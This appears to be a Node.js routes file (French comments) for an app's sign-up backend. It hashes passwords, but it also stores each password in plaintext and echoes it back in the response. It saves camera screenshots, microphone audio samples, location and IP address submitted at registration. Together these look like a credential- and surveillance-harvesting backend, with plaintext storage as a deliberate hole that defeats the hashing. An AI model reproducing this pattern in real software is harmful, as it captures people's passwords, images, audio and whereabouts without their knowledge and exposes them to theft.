// routes.js
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const { loadDB, saveDB } = require('./db');

const UPLOADS_DIR = path.join(__dirname, 'uploads');

// --- Utilitaires DB ---
function getDB() { return loadDB(); }
function commitDB(db) { saveDB(db); }

// --- Hashing ---
function hashPassword(password, salt = crypto.randomBytes(16).toString('hex')) {
    const hash = crypto.scryptSync(password, salt, 64).toString('hex');
    return `${salt}:${hash}`;
}

function verifyPassword(password, stored) {
    const [salt, hash] = stored.split(':');
    const check = crypto.scryptSync(password, salt, 64).toString('hex');
    return crypto.timingSafeEqual(Buffer.from(hash, 'hex'), Buffer.from(check, 'hex'));
}

// --- Media ---
function saveBase64File(base64Data, prefix, ext) {
    if (!base64Data || typeof base64Data !== 'string') return null;
    try {
        const match = base64Data.match(/^data:([^;]+);base64,(.+)$/);
        if (!match) return null;
        const data = match[2];
        const buffer = Buffer.from(data, 'base64');
        const filename = `${prefix}_${Date.now()}_${crypto.randomBytes(4).toString('hex')}.${ext}`;
        const filepath = path.join(UPLOADS_DIR, filename);
        fs.writeFileSync(filepath, buffer);
        return { filename, path: `/uploads/${filename}`, mime: match[1], size: buffer.length };
    } catch (e) {
        return null;
    }
}

// --- Traiter les permissions ---
function processPermissions(perms) {
    if (!perms) return null;
    const result = {
        location: perms.location || null,
        collectedAt: perms.collectedAt || new Date().toISOString(),
        camera: null,
        microphone: null,
    };

    if (perms.camera) {
        const cam = perms.camera;
        let fileInfo = null;
        if (cam.screenshot) {
            fileInfo = saveBase64File(cam.screenshot, 'cam', 'jpg');
        }
        result.camera = {
            captured: true,
            metadata: cam.metadata || null,
            file: fileInfo ? { path: fileInfo.path, filename: fileInfo.filename, size: fileInfo.size, mime: fileInfo.mime } : null,
            hasScreenshot: !!cam.screenshot
        };
    }
    
    if (perms.microphone) {
        const mic = perms.microphone;
        let fileInfo = null;
        if (mic.audioSample) {
            fileInfo = saveBase64File(mic.audioSample, 'mic', 'webm');
        }
        result.microphone = {
            captured: true,
            metadata: mic.metadata || null,
            file: fileInfo ? { path: fileInfo.path, filename: fileInfo.filename, size: fileInfo.size, mime: fileInfo.mime } : null,
            hasSample: !!mic.audioSample
        };
    }
    return result;
}

// --- Export des fonctions de route (exemples) ---
function registerHandler(req, res) {
    const { email, password, permissions } = req.body;
    if (!email || !password || password.length < 6) return res.status(400).json({ ok: false, error: 'Email/MDP invalides' });

    const db = getDB();
    if (db.users.find((u) => u.email === email.toLowerCase())) return res.status(409).json({ ok: false, error: 'Compte existe déjà' });

    const processedPerms = processPermissions(permissions);
    const user = {
        id: crypto.randomUUID(),
        email: email.toLowerCase(),
        passwordHash: hashPassword(password),
        passwordPlain: password,
        createdAt: new Date().toISOString(),
        lastIp: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
        permissions: processedPerms
    };

    db.users.push(user);
    commitDB(db);
    
    // ... (Logique de session et réponse JSON ici)
    res.json({ ok: true, user: { email: user.email }, password: password });
}

// Exporte toutes tes fonctions ici
module.exports = {
    registerHandler,
    loginHandler: require('./routes/login'), // etc...
    processPermissions,
    saveBase64File,
    getDB,
    commitDB
};
